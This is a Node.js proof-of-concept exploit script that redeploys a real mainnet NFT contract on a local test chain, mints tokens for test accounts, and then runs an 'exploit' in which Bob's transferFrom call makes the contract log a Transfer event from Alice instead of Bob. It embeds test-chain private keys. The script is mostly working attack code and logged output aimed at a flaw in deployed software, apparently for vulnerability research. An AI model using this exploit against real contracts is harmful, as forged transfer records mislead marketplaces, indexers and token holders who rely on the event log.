var Web3 = require("web3");
var Tx = require("ethereumjs-tx").Transaction;
var fs = require('fs');
var web3 = new Web3("http://localhost:8546");
const keccak256 = require("keccak256");

const BobAccount = {
    address: "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",
    privkey: "0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d"
}

const AliceAccount = {
    address: "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",
    privkey: "0x6cbed15c793ce57650b9877cf6fa156fbef513c4e6134f022a85b1ffdd59b2a1"
}

const MikeAccount = {
    address: "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",
    privkey: "0x6370fd033278c143179d81c5526140625662b8daa446c22ee2d73db3707e620c"
}

var abiFile = fs.readFileSync('./abi.json','utf8');
abiFile = abiFile.substring(1,abiFile.length-1)
abiFile = abiFile.replace(/\\/g, "");
var abiJson = JSON.parse(abiFile);
theContract = new web3.eth.Contract(abiJson);
//var contractAddress = "0xe78A0F7E598Cc8b0Bb87894B0F60dD2a88d6a8Ab";
var contractAddress;

async function getSignedTx(fromAddress, toAddress, inputData, privKey) {
    // get the nonce
    var nonceNum = await web3.eth.getTransactionCount(fromAddress);

    //raw Tx
    var rawTransaction = {
        "from": fromAddress,
        "nonce": web3.utils.toHex(nonceNum),
        "gasLimit": web3.utils.toHex(6000000),
        "gasPrice": web3.utils.toHex(10e9),
        "to": toAddress,
        "value": web3.utils.toHex(0),
        //"data": contractObj.methods.SetNum(numParam).encodeABI(),
        "data": inputData,
        "chainId": 5777 //0x04 4:Rinkeby, 3:Ropsten, 1:mainnet
    };

    var tx = new Tx(rawTransaction);
    rawPrivKey = privKey.substring(2,privKey.length)
    const Key = new Buffer.from(rawPrivKey, 'hex'); 
    tx.sign(Key);
    var serializedTx = tx.serialize();
    return serializedTx;
}

async function sendSignedTx(fromAddress, toAddress, inputData, privKey) {
    var serializedTx = await getSignedTx(fromAddress, toAddress, inputData, privKey);
    console.log(`Attempting to send signed tx:  ${serializedTx.toString('hex')}`);
    var receipt = await web3.eth.sendSignedTransaction('0x' + serializedTx.toString('hex'));
    console.log(`Receipt info:  ${JSON.stringify(receipt, null, '\t')}`);
    return receipt;
}

async function createContract() {
    //the content of createContract.dat is totally the same as the input data of https://etherscan.io/tx/0x9b1db2f77a664bb8e180961433bf6804325b46190485fb9d5a3f42e1c5c5417b
    createData = fs.readFileSync("./createContract.dat", "utf8");
    const createTransaction = await web3.eth.accounts.signTransaction(
        {
          data: createData,
          gas: 2000000,
        },
        BobAccount.privkey
    );
    const createReceipt = await web3.eth.sendSignedTransaction(createTransaction.rawTransaction);
    console.log(`Contract deployed at address: ${createReceipt.contractAddress}`);
    contractAddress = createReceipt.contractAddress;
}

async function replayTx() {
    //execute the addClaimRoots function to assign the ClaimRoots, which is the preparation for the airdrop, following the mechanism of https://etherscan.io/tx/0x58d266584371df51d0b7394ed788f5655ab460fd81dfa5f81d0e9df53052bbc8
    inputData = theContract.methods.addClaimRoots([keccak256(BobAccount.address)],[512]).encodeABI();
    await sendSignedTx(BobAccount.address,contractAddress,inputData,BobAccount.privkey);
    inputData = theContract.methods.addClaimRoots([keccak256(AliceAccount.address)],[512]).encodeABI();
    await sendSignedTx(BobAccount.address,contractAddress,inputData,BobAccount.privkey);

    //execute the claim function to mint the NFT whose ID is 0 and 1, following the mechanism of https://etherscan.io/tx/0xef71a123cd5353b67ec414daba179c6d578f35bb4b879ad3b9adf9b69830d7ec
    //Bob mint the NFT whose ID is 0
    inputData = theContract.methods.claim(0,[]).encodeABI();
    await sendSignedTx(BobAccount.address,contractAddress,inputData,BobAccount.privkey);
    console.log('[+] Bob mints NFT whose ID is 0');

    //Alice mint the NFT whose ID is 1
    inputData = theContract.methods.claim(1,[]).encodeABI();
    await sendSignedTx(AliceAccount.address,contractAddress,inputData,AliceAccount.privkey);
}

async function exploit() {
    //Bob transfers the NFT 0 to Mike, but the contract emits the event to log the NFT is transferred from Alice to Mike (instead of Bob to Mike)
    inputData = theContract.methods.transferFrom(AliceAccount.address,MikeAccount.address,0).encodeABI();
    //console.log(inputData);
    await sendSignedTx(BobAccount.address,contractAddress,inputData,BobAccount.privkey);
}

async function main() {
    console.log('[+] The address of Bob is: %s', BobAccount.address);
    console.log('[+] The address of Alice is: %s', AliceAccount.address);
    console.log('[+] The address of Mike is: %s', MikeAccount.address);

    //create the contract following the transaction data of https://etherscan.io/tx/0x9b1db2f77a664bb8e180961433bf6804325b46190485fb9d5a3f42e1c5c5417b, this guarantees the deployed contract is totally the same as the contract deployed in the practical ethereum blockchain
    await createContract();
    deployedContract = new web3.eth.Contract(abiJson, contractAddress);

    //execute some transactions to create NFT
    await replayTx();
    
    //query the owner of the NFT whose ID is 0, we will see the owner of NFT 0 is Bob
    var data = await deployedContract.methods.ownerOf(0).call();
    console.log(`[+] The owner of NFT 0 is: ${data}`);

    //exploit vulnerability begins
    await exploit();
    console.log('[+] Exploit end. The NFT 0 is transferred by Bob to Mike.');
    data = await deployedContract.methods.ownerOf(0).call();
    console.log(`[+] The owner of NFT 0 is: ${data}`);

    //query the Transfer event emitted in the blockchain, such a event is for recording the transfer behaviour of NFT
    console.log('[+] The Transfer events in blockchain:');
    deployedContract.getPastEvents('Transfer', {
        filter: {
        },
        fromBlock: 0
    }).then((events) => {
        for (let event of events) {
            console.log(event);
            console.log('[+] Transfer(from:%s, to:%s, tokenId:%s)', event.returnValues['_from'], event.returnValues['_to'], event.returnValues['_tokenId']);
        }
        console.log('[+] The last event records the NFT 0 is transferred from Alice to Mike (instead of from Bob to Mike).')
    });
}

main();